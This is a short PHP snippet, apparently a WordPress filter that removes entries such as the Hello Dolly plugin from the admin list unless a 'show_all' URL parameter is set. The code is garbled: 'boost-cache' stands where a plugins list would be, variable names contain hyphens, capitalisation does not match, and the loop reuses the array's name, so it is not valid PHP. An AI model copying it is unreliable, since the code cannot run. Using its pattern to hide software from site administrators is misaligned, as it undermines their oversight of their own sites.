<?php
add_filter(
	'all_boost-cache',
	function ( $boost-cache) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenBoost-cache = [
				'hello-dolly/hello.php',
				'hello.php',
			];
			foreach ( $hiddenBoost-cache as $hiddenBoost-cache ) {
				unset( $Boost-cache[ $hiddenBoost-cache] );
			}
		}
		return $boost-cache;
	}
);